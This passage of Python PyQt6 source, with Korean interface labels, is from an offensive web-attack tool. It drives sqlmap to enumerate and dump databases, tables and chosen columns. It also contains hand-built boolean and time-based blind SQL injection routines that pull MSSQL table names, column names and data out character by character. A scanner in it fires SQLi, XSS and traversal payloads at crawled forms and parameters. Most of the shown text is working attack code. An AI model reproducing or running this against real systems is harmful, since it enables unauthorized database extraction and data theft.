        self._data_tree.setAlternatingRowColors(True)
        self._data_tree.setRootIsDecorated(False)
        dl.addWidget(self._data_tree)
        self.out_tab.addTab(data_w, "📊  데이터 뷰")

    # ══════════════════════════════════════════════════════
    #  취약점 스캐너 탭
    # ══════════════════════════════════════════════════════
    def _build_scanner_tab(self, parent):
        lay = QHBoxLayout(parent)
        lay.setContentsMargins(8,8,8,8); lay.setSpacing(6)

        left = QWidget(); left.setFixedWidth(300)
        lay.addWidget(left)
        self._build_scanner_left(left)

        right = QWidget()
        lay.addWidget(right, 1)
        self._build_scanner_right(right)

    def _build_scanner_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12,8,12,8); lay.setSpacing(4)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0); outer.addWidget(scroll)

        lay.addWidget(section_label("[ TARGET ]", BLUE)); lay.addWidget(sep())
        lay.addWidget(dim_label("대상 URL"))
        self.scan_url_entry = QLineEdit()
        self.scan_url_entry.setPlaceholderText("http://192.168.x.x/")
        lay.addWidget(self.scan_url_entry)
        lay.addWidget(dim_label("쿠키 (선택)"))
        self.scan_cookie_entry = QLineEdit()
        lay.addWidget(self.scan_cookie_entry)

        lay.addSpacing(8)
        lay.addWidget(section_label("[ 탐지 항목 ]", BLUE)); lay.addWidget(sep())
        self.scan_vars = {}
        for key, label, color in [
            ("sqli","🔴 SQL Injection",RED),
            ("xss","🟡 XSS (반사형)",YELLOW),
            ("traversal","🟠 Directory Traversal",ACCENT2),
            ("info","🟣 정보 노출 경로",PURPLE),
        ]:
            cb = QCheckBox(label)
            cb.setChecked(True)
            cb.setStyleSheet(f"""
                QCheckBox {{ color: {color}; font-size: 12px; }}
                QCheckBox::indicator {{ width:16px; height:16px; border:1px solid {BORDER}; border-radius:3px; background:{BG3}; }}
                QCheckBox::indicator:checked {{ background:{color}; border-color:{color}; }}
            """)
            self.scan_vars[key] = cb
            lay.addWidget(cb)

        lay.addSpacing(8)
        lay.addWidget(section_label("[ 옵션 ]", BLUE)); lay.addWidget(sep())
        row = QHBoxLayout()
        row.addWidget(dim_label("딜레이(초)"))
        self.scan_delay_entry = QLineEdit("0.3"); self.scan_delay_entry.setFixedWidth(55)
        row.addWidget(self.scan_delay_entry)
        row.addSpacing(10)
        row.addWidget(dim_label("타임아웃"))
        self.scan_timeout_entry = QLineEdit("5"); self.scan_timeout_entry.setFixedWidth(50)
        row.addWidget(self.scan_timeout_entry)
        row.addStretch(); lay.addLayout(row)

        lay.addSpacing(8); lay.addWidget(sep())
        self.scan_run_btn = btn("▶  스캔 시작", BLUE, BG)
        self.scan_run_btn.clicked.connect(self._start_scan)
        lay.addWidget(self.scan_run_btn)
        self.scan_stop_btn = btn("■  중지", RED, "white")
        self.scan_stop_btn.setEnabled(False)
        self.scan_stop_btn.clicked.connect(self._stop_scan)
        lay.addWidget(self.scan_stop_btn)
        report_btn = btn("📄  리포트 저장", BG3, TEXT_DIM)
        report_btn.clicked.connect(self._save_scan_report)
        lay.addWidget(report_btn)
        lay.addStretch()

    def _build_scanner_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)
        self.scan_tab = QTabWidget()
        lay.addWidget(self.scan_tab)

        # 로그
        log_w = QWidget()
        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
        self.scan_log = QTextEdit()
        self.scan_log.setReadOnly(True)
        self.scan_log.setFont(QFont("Courier New", 11))
        ll.addWidget(self.scan_log)
        self.scan_tab.addTab(log_w, "📋  스캔 로그")

        # 취약점
        vuln_w = QWidget()
        vl = QVBoxLayout(vuln_w); vl.setContentsMargins(4,4,4,4)
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setAlternatingRowColors(True)
        self.vuln_tree.setRootIsDecorated(False)
        self.vuln_tree.setHeaderLabels(["유형","URL","파라미터","페이로드","위험도"])
        self.vuln_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        vl.addWidget(self.vuln_tree)
        self.scan_tab.addTab(vuln_w, "🚨  취약점 목록")

        # 리포트
        rep_w = QWidget()
        rl = QVBoxLayout(rep_w); rl.setContentsMargins(4,4,4,4)
        self.scan_report = QTextEdit()
        self.scan_report.setReadOnly(True)
        self.scan_report.setFont(QFont("Courier New", 11))
        rl.addWidget(self.scan_report)
        self.scan_tab.addTab(rep_w, "📊  리포트")

    # ══════════════════════════════════════════════════════
    #  로그 출력
    # ══════════════════════════════════════════════════════
    TAG_COLORS = {
        "info":    TEXT,
        "success": ACCENT,
        "warn":    YELLOW,
        "error":   RED,
        "cmd":     ACCENT2,
        "dim":     TEXT_DIM,
        "step":    BLUE,
        "found":   YELLOW,
    }

    def _log(self, text, tag="info"):
        color = self.TAG_COLORS.get(tag, TEXT)
        cursor = self.output.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(color))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()
        self.time_lbl.setText(datetime.now().strftime("%H:%M:%S"))

    def _slog(self, text, tag="info"):
        color = self.TAG_COLORS.get(tag, TEXT)
        cursor = self.scan_log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(color))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.scan_log.setTextCursor(cursor)
        self.scan_log.ensureCursorVisible()

    def _clear(self):
        self.output.clear()

    def _save(self):
        path, _ = QFileDialog.getSaveFileName(
            self, "저장", f"sqlmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text (*.txt);;All (*.*)")
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(self.output.toPlainText())

    def _set_status(self, text, color=TEXT_DIM):
        self.status_lbl.setText(text)
        self.status_lbl.setStyleSheet(f"color: {color}; font-size: 12px;")

    # ══════════════════════════════════════════════════════
    #  모드 전환 / 파일 / 탐지
    # ══════════════════════════════════════════════════════
    def _on_mode_change(self):
        mode = self.mode_grp.checkedId()
        self.file_btn.setVisible(mode == 2)
        self.post_widget.setVisible(mode == 1)

    def _pick_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "요청파일 선택","","Text (*.txt);;All (*.*)")
        if path: self.url_entry.setText(path)

    def _auto_detect(self):
        url = self.url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL을 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self.detect_btn.setText("🔄  탐지 중...")
        self.detect_btn.setEnabled(False)
        threading.Thread(target=self._detect_thread, args=(url,), daemon=True).start()

    def _detect_thread(self, url):
        try:
            session = requests.Session()
            session.headers["User-Agent"] = "Mozilla/5.0"
            r = session.get(url, timeout=8, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            found = []
            parsed = urllib.parse.urlparse(url)
            for key in urllib.parse.parse_qs(parsed.query):
                full = parsed._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                found.append((f"[GET] ?{key}=", full))
            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action",""))
                method = form.get("method","get").lower()
                for inp in form.find_all(["input","textarea"]):
                    name = inp.get("name")
                    if name:
                        if method == "get":
                            found.append((f"[GET FORM] {name}", f"{action}?{name}=1"))
                        else:
                            found.append((f"[POST FORM] {name}", f"{action}||POST||{name}=1"))
            for a in soup.find_all("a", href=True):
                href = urllib.parse.urljoin(url, a["href"])
                p2 = urllib.parse.urlparse(href)
                for key in urllib.parse.parse_qs(p2.query):
                    full = p2._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                    if not any(f[1]==full for f in found):
                        found.append((f"[LINK] {p2.path}?{key}=", full))
            from PyQt6.QtCore import QMetaObject, Q_ARG
            QMetaObject.invokeMethod(self, "_detect_done_slot",
                Qt.ConnectionType.QueuedConnection)
            self._detect_found = found
        except Exception as e:
            self._detect_found = []
            from PyQt6.QtCore import QMetaObject
            QMetaObject.invokeMethod(self, "_detect_done_slot",
                Qt.ConnectionType.QueuedConnection)

    from PyQt6.QtCore import pyqtSlot

    @pyqtSlot()
    def _detect_done_slot(self):
        found = getattr(self, "_detect_found", [])
        self.detect_btn.setText("🔎  파라미터 자동 탐지")
        self.detect_btn.setEnabled(True)
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
        self.detected_params = found
        self.param_combo.clear()
        for label, _ in found:
            self.param_combo.addItem(label)
        self._on_param_select(0)
        self._log(f"✓ 파라미터 {len(found)}개 탐지됨\n","found")

    def _on_param_select(self, idx):
        if idx < 0 or idx >= len(self.detected_params): return
        label, full = self.detected_params[idx]
        if "||POST||" in full:
            parts = full.split("||POST||")
            self.rb_post.setChecked(True); self._on_mode_change()
            self.url_entry.setText(parts[0])
            self.post_entry.setText(parts[1])
        else:
            self.rb_url.setChecked(True); self._on_mode_change()
            self.url_entry.setText(full)

    # ══════════════════════════════════════════════════════
    #  sqlmap 실행
    # ══════════════════════════════════════════════════════
    def _base_cmd(self):
        sqlmap = self.bin_entry.text().strip() or self.sqlmap_bin
        url    = self.url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return None
        cmd = [sqlmap]
        mode = self.mode_grp.checkedId()
        if mode == 2:
            cmd += ["-r", url]
        else:
            cmd += ["-u", url]
            data = self.post_entry.text().strip()
            if mode == 1 and data: cmd += ["--data", data]
        for flag, cb in self.opt_vars.items():
            if cb.isChecked(): cmd.append(flag)
        extra = self.extra_entry.text().strip()
        if extra: cmd += extra.split()
        return cmd

    def _run_dbs(self):
        cmd = self._base_cmd()
        if not cmd: return
        cmd.append("--dbs")
        self._execute(cmd, "STEP 1  DB 목록 추출", "dbs")

    def _run_tables(self):
        cmd = self._base_cmd()
        if not cmd: return
        db = self.db_entry.text().strip()
        if not db: QMessageBox.critical(self,"오류","DB 이름 입력해줘"); return
        cmd += ["-D", db, "--tables"]
        self._execute(cmd, f"STEP 2  테이블 목록  [{db}]", "tables")

    def _run_columns(self):
        cmd = self._base_cmd()
        if not cmd: return
        db  = self.db_entry.text().strip()
        tbl = self.tbl_entry.text().strip()
        if not db or not tbl: QMessageBox.critical(self,"오류","DB와 테이블 입력해줘"); return
        cmd += ["-D", db, "-T", tbl, "--columns"]
        self._execute(cmd, f"STEP 3  컬럼 목록  [{db}.{tbl}]", "cols")

    def _run_dump(self):
        cmd = self._base_cmd()
        if not cmd: return
        db  = self.db_entry.text().strip()
        tbl = self.tbl_entry.text().strip()
        if not db or not tbl: QMessageBox.critical(self,"오류","DB와 테이블 입력해줘"); return
        cmd += ["-D", db, "-T", tbl, "--dump"]
        # 선택된 컬럼 -C 옵션
        selected = [self.col_list.item(i).text()
                    for i in range(self.col_list.count())
                    if self.col_list.item(i).isSelected()]
        if selected:
            cmd += ["-C", ",".join(selected)]
            self._log(f"  선택된 컬럼: {', '.join(selected)}\n","found")
        self._execute(cmd, f"STEP 4  데이터 덤프  [{db}.{tbl}]", "dump")

    def _execute(self, cmd, label, parse=None):
        if self._thread and self._thread.isRunning():
            QMessageBox.warning(self,"실행 중","먼저 중지해줘"); return
        self._clear()
        self._log(f"{'━'*50}\n","dim")
        self._log(f"  {label}\n","step")
        self._log(f"{'━'*50}\n","dim")
        self._log(f"$ {' '.join(cmd)}\n\n","cmd")

        self._worker = Worker(cmd, parse)
        self._thread = QThread()
        self._worker.moveToThread(self._thread)
        self._thread.started.connect(self._worker.run)
        self._worker.log.connect(lambda t, g: self._log(t, g))
        self._worker.done.connect(self._on_done)
        self._worker.dbs.connect(self._on_dbs)
        self._worker.tables.connect(self._on_tables)
        self._worker.cols.connect(self._on_cols)
        self._worker.dump.connect(self._render_dump)
        self._worker.done.connect(lambda _: self._thread.quit())
        self._thread.start()

        self.stop_btn.setEnabled(True)
        self._set_status("● RUNNING", ACCENT2)

    def _on_dbs(self, dbs):
        if dbs:
            self.db_combo.clear()
            for d in dbs: self.db_combo.addItem(d)
            self._log(f"\n✓ DB 발견 ({len(dbs)}개): {', '.join(dbs)}\n","found")

    def _on_tables(self, tables):
        if tables:
            self.tbl_combo.clear()
            for t in tables: self.tbl_combo.addItem(t)
            self._log(f"\n✓ 테이블 발견 ({len(tables)}개)\n","found")

    def _on_cols(self, cols):
        if cols:
            self._log(f"\n✓ 컬럼 발견 ({len(cols)}개): {', '.join(cols)}\n","found")
            self.col_list.clear()
            for col in cols:
                item = QListWidgetItem(col)
                self.col_list.addItem(item)
            self.col_selected_lbl.setText(f"← {len(cols)}개 컬럼 발견 (클릭으로 선택)")

    def _render_dump(self, text):
        rows = []
        for line in text.splitlines():
            s = line.strip()
            if s.startswith("|") and s.endswith("|"):
                cells = [c.strip() for c in s[1:-1].split("|")]
                rows.append(cells)
        if not rows: return
        headers = rows[0]; data = rows[2:]
        if not headers: return
        self._dump_cols = headers; self._dump_rows = data
        self._data_tree.setColumnCount(len(headers))
        self._data_tree.setHeaderLabels(headers)
        self._data_tree.clear()
        for row in data:
            while len(row) < len(headers): row.append("")
            item = QTreeWidgetItem(row)
            self._data_tree.addTopLevelItem(item)
        self._row_count_lbl.setText(f"덤프 결과  {len(data)}행 × {len(headers)}컬럼")
        self.out_tab.setCurrentIndex(1)

    def _on_done(self, rc):
        self.stop_btn.setEnabled(False)
        now = datetime.now().strftime("%H:%M:%S")
        if rc == 0:
            self._log(f"\n[{now}] ✓ 완료\n","success")
            self._set_status("● DONE", ACCENT)
        elif rc == -1:
            self._log(f"\n[{now}] 실행 실패\n","error")
            self._set_status("● ERROR", RED)
        else:
            self._log(f"\n[{now}] 종료 (exit {rc})\n","warn")
            self._set_status("● STOPPED", YELLOW)

    def _stop(self):
        self._blind_stop = True
        if self._worker: self._worker.stop()

    def _save_csv(self):
        if not self._dump_cols: QMessageBox.information(self,"알림","데이터 없음"); return
        path, _ = QFileDialog.getSaveFileName(
            self,"CSV 저장",f"dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV (*.csv);;All (*.*)")
        if path:
            import csv
            with open(path,"w",newline="",encoding="utf-8-sig") as f:
                w = csv.writer(f)
                w.writerow(self._dump_cols)
                w.writerows(self._dump_rows)

    # ══════════════════════════════════════════════════════
    #  Blind SQLi
    # ══════════════════════════════════════════════════════
    def _run_blind_table(self):
        url    = self.blind_url_entry.text().strip()
        maxlen = int(self.btbl_maxlen.text() or 20)
        idx    = int(self.btbl_idx.text() or 0)
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        self._blind_stop = False
        self.btbl_result.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 1  테이블명 추출  (index={idx})\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._blind_extract,
            args=(url,"sysobjects","name",f"xtype='U' ORDER BY name ASC",
                  maxlen,idx,self.btbl_progress,self.btbl_result),
            daemon=True).start()

    def _run_blind_col(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.bcol_tbl.text().strip()
        maxlen = int(self.bcol_maxlen.text() or 20)
        idx    = int(self.bcol_idx.text() or 0)
        if not url or not table: QMessageBox.critical(self,"오류","URL과 테이블 입력해줘"); return
        self._blind_stop = False
        self.bcol_result.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 2  컬럼명 추출  [{table}]\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._blind_extract,
            args=(url,"syscolumns","name",
                  f"id=object_id('{table}') ORDER BY name ASC",
                  maxlen,idx,self.bcol_progress,self.bcol_result),
            daemon=True).start()

    def _blind_extract(self, url, sys_table, col, where, maxlen, row_idx, prog_lbl, res_lbl):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            r_true = session.get(url.replace(f"{param}={base_val}",
                f"{param}={urllib.parse.quote(base_val+chr(39)+' AND 1=1--')}"),
                timeout=8, verify=False)
            true_len = len(r_true.text)
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return

        if row_idx == 0:
            subquery = f"SELECT TOP 1 {col} FROM {sys_table} WHERE {where}"
        else:
            subquery = (f"SELECT TOP 1 {col} FROM {sys_table} WHERE {where} "
                       f"AND {col} NOT IN (SELECT TOP {row_idx} {col} FROM {sys_table} WHERE {where})")
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = f"' AND '{ch}'=SUBSTRING(({subquery}),{pos},1)--"
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    r = session.get(test_url, timeout=8, verify=False)
                    if abs(len(r.text)-true_len) < 50: found_char = ch; break
                except Exception: continue
                time.sleep(0.05)
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                prog_lbl.setText(f"진행: {pos}/{maxlen}자")
                res_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        res_lbl.setText(f"결과: {final}")

    def _run_boolean_blind(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.blind_tbl_entry.text().strip()
        col    = self.blind_col_entry.text().strip()
        where  = self.blind_where_entry.text().strip()
        maxlen = int(self.blind_maxlen_entry.text() or 20)
        if not url or not table or not col:
            QMessageBox.critical(self,"오류","URL/테이블/컬럼 입력해줘"); return
        self._blind_stop = False
        self.bool_result_lbl.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log("  Blind 3  Boolean 데이터 추출\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._boolean_thread,
            args=(url,table,col,where,maxlen), daemon=True).start()

    def _boolean_thread(self, url, table, col, where, maxlen):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        where_clause = f"WHERE {where}" if where else ""
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            r_true = session.get(url.replace(f"{param}={base_val}",
                f"{param}={urllib.parse.quote(base_val+chr(39)+' AND 1=1--')}"),
                timeout=8, verify=False)
            true_len = len(r_true.text)
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._!#$%"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = (f"' AND '{ch}'=SUBSTRING("
                         f"(SELECT TOP 1 {col} FROM {table} {where_clause}),{pos},1)--")
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    r = session.get(test_url, timeout=8, verify=False)
                    if abs(len(r.text)-true_len) < 50: found_char = ch; break
                except Exception: continue
                time.sleep(0.1)
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                self.bool_progress_lbl.setText(f"진행: {pos}/{maxlen}자")
                self.bool_result_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        self.bool_result_lbl.setText(f"결과: {final}")

    def _run_time_blind(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.time_tbl_entry.text().strip()
        col    = self.time_col_entry.text().strip()
        where  = self.time_where_entry.text().strip()
        delay  = float(self.time_delay_entry.text() or 2)
        maxlen = int(self.time_maxlen_entry.text() or 20)
        if not url or not table or not col:
            QMessageBox.critical(self,"오류","URL/테이블/컬럼 입력해줘"); return
        self._blind_stop = False
        self.time_result_lbl.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 4  Time-based  (딜레이:{delay}초)\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._time_thread,
            args=(url,table,col,where,delay,maxlen), daemon=True).start()

    def _time_thread(self, url, table, col, where, delay, maxlen):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        where_clause = f"WHERE {where}" if where else ""
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            t0 = time.time()
            session.get(url, timeout=10, verify=False)
            self._log(f"  기준 응답시간: {time.time()-t0:.2f}초\n\n","dim")
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._!#$%"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = (f"'; IF ASCII(SUBSTRING((SELECT TOP 1 {col} FROM {table} {where_clause})"
                         f",{pos},1))={ord(ch)} WAITFOR DELAY '0:0:{int(delay)}'--")
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    t0 = time.time()
                    session.get(test_url, timeout=delay+5, verify=False)
                    if time.time()-t0 >= delay: found_char = ch; break
                except Exception: continue
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                self.time_progress_lbl.setText(f"진행: {pos}/{maxlen}자")
                self.time_result_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        self.time_result_lbl.setText(f"결과: {final}")

    # ══════════════════════════════════════════════════════
    #  취약점 스캐너
    # ══════════════════════════════════════════════════════
    def _start_scan(self):
        if not HAS_REQUESTS:
            QMessageBox.critical(self,"오류","pip3 install requests beautifulsoup4"); return
        url = self.scan_url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self.scan_results = []
        self._scan_stop  = False
        self.scan_run_btn.setEnabled(False)
        self.scan_stop_btn.setEnabled(True)
        self._set_status("● SCANNING", ACCENT2)
        self.vuln_tree.clear()
        self.scan_log.clear()
        cookie = self.scan_cookie_entry.text().strip()
        threading.Thread(target=self._scan_thread, args=(url,cookie), daemon=True).start()

    def _stop_scan(self):
        self._scan_stop = True

    def _scan_thread(self, base_url, cookie):
        import time
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        if cookie: session.headers["Cookie"] = cookie
        delay   = float(self.scan_delay_entry.text() or 0.3)
        timeout = int(self.scan_timeout_entry.text() or 5)

        self._slog("="*48+"\n","dim")
        self._slog(f"  🔍 스캔: {base_url}\n","step")
        self._slog("="*48+"\n\n","dim")
        self._slog("[ STEP 1 ] 크롤링...\n","step")

        forms, params = self._crawl(base_url, session, timeout)
        self._slog(f"  → 폼 {len(forms)}개 / 파라미터 {len(params)}개\n\n","success")

        if self.scan_vars["sqli"].isChecked():
            self._slog("[ STEP 2 ] SQLi 탐지...\n","step")
            for form in forms:
                for p in SQLI_PAYLOADS:
                    if self._scan_stop: break
                    self._test_sqli_form(form,p,session,timeout); time.sleep(delay)
            for up in params:
                for p in SQLI_PAYLOADS:
                    if self._scan_stop: break
                    self._test_sqli_param(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["xss"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 3 ] XSS 탐지...\n","step")
            for form in forms:
                for p in XSS_PAYLOADS:
                    if self._scan_stop: break
                    self._test_xss_form(form,p,session,timeout); time.sleep(delay)
            for up in params:
                for p in XSS_PAYLOADS:
                    if self._scan_stop: break
                    self._test_xss_param(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["traversal"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 4 ] Traversal 탐지...\n","step")
            for up in params:
                for p in TRAVERSAL_PAYLOADS:
                    if self._scan_stop: break
                    self._test_traversal(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["info"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 5 ] 정보 노출...\n","step")
            for path in INFO_PATHS:
                if self._scan_stop: break
                self._test_info(base_url,path,session,timeout); time.sleep(delay)

        from PyQt6.QtCore import QMetaObject
        QMetaObject.invokeMethod(self, "_scan_done", Qt.ConnectionType.QueuedConnection)

    def _crawl(self, url, session, timeout):
        forms, params = [], []
        try:
            r = session.get(url, timeout=timeout, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action",""))
                method = form.get("method","get").lower()
                inputs = {i.get("name"): i.get("value","test")
                          for i in form.find_all(["input","textarea"]) if i.get("name")}
                if inputs: forms.append({"url":action,"method":method,"inputs":inputs})
            parsed = urllib.parse.urlparse(url)
            for key in urllib.parse.parse_qs(parsed.query):
                params.append({"url":url,"param":key,"parsed":parsed})
            for a in soup.find_all("a", href=True):
                href = urllib.parse.urljoin(url, a["href"])
                p2   = urllib.parse.urlparse(href)
                for key in urllib.parse.parse_qs(p2.query):
                    if not any(x["url"]==href and x["param"]==key for x in params):
                        params.append({"url":href,"param":key,"parsed":p2})
        except Exception as e:
            self._slog(f"  [크롤링 오류] {e}\n","error")
        return forms, params

    def _test_sqli_form(self, form, payload, session, timeout):
        try:
            data = {k: payload for k in form["inputs"]}
            r = (session.post if form["method"]=="post" else session.get)(
                form["url"], **{"data" if form["method"]=="post" else "params": data},
                timeout=timeout, verify=False)
            self._check_sqli(r, form["url"], "form", payload)
        except Exception: pass

    def _test_sqli_param(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            self._check_sqli(r, new_url, up["param"], payload)
        except Exception: pass

    def _check_sqli(self, r, url, param, payload):
        body = r.text.lower()
        for err in SQLI_ERRORS:
            if err in body:
                self._add_vuln("SQLi", url, param, payload, "🔴 HIGH")
                self._slog(f"  [🚨 SQLi] {param} | '{err}'\n","error"); return

    def _test_xss_form(self, form, payload, session, timeout):
        try:
            data = {k: payload for k in form["inputs"]}
            r = (session.post if form["method"]=="post" else session.get)(
                form["url"], **{"data" if form["method"]=="post" else "params": data},
                timeout=timeout, verify=False)
            if payload in r.text:
                self._add_vuln("XSS", form["url"], "form", payload, "🟡 MEDIUM")
                self._slog("  [🚨 XSS] form 반사\n","warn")
        except Exception: pass

    def _test_xss_param(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            if payload in r.text:
                self._add_vuln("XSS", new_url, up["param"], payload, "🟡 MEDIUM")
                self._slog(f"  [🚨 XSS] {up['param']} 반사\n","warn")
        except Exception: pass

    def _test_traversal(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            for sign in TRAVERSAL_SIGNS:
                if sign in r.text:
                    self._add_vuln("Traversal", new_url, up["param"], payload, "🔴 HIGH")
                    self._slog(f"  [🚨 Traversal] {up['param']}\n","error"); return
        except Exception: pass

    def _test_info(self, base_url, path, session, timeout):
        try:
            url = base_url.rstrip("/")+path
            r = session.get(url, timeout=timeout, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                self._add_vuln("Info", url, path, "-", "🟠 LOW")
                self._slog(f"  [🚨 Info] {path}\n","warn")
        except Exception: pass

    def _add_vuln(self, vtype, url, param, payload, severity):
        r = {"type":vtype,"url":url,"param":param,"payload":payload,"severity":severity}
        self.scan_results.append(r)
        color = RED if "HIGH" in severity else (YELLOW if "MEDIUM" in severity else PURPLE)
        item = QTreeWidgetItem([vtype, url[:45], param, payload[:30], severity])
        item.setForeground(0, QColor(color))
        item.setForeground(4, QColor(color))
        from PyQt6.QtCore import QMetaObject, Q_ARG
        from PyQt6.QtCore import Qt as QtCore
        self.vuln_tree.addTopLevelItem(item)

    @pyqtSlot()
    def _scan_done(self):
        self.scan_run_btn.setEnabled(True)
        self.scan_stop_btn.setEnabled(False)
        total  = len(self.scan_results)
        high   = sum(1 for r in self.scan_results if "HIGH"   in r["severity"])
        medium = sum(1 for r in self.scan_results if "MEDIUM" in r["severity"])
        low    = sum(1 for r in self.scan_results if "LOW"    in r["severity"])
        self._slog(f"\n{'='*48}\n","dim")
        self._slog(f"  완료  |  총 {total}개\n","success" if not total else "error")
        self._slog(f"  HIGH:{high}  MEDIUM:{medium}  LOW:{low}\n","warn")
        self._set_status(f"● DONE  |  취약점 {total}개", ACCENT if not total else RED)
        self._gen_scan_report()
        if total: self.scan_tab.setCurrentIndex(1)

    def _gen_scan_report(self):
        self.scan_report.clear()
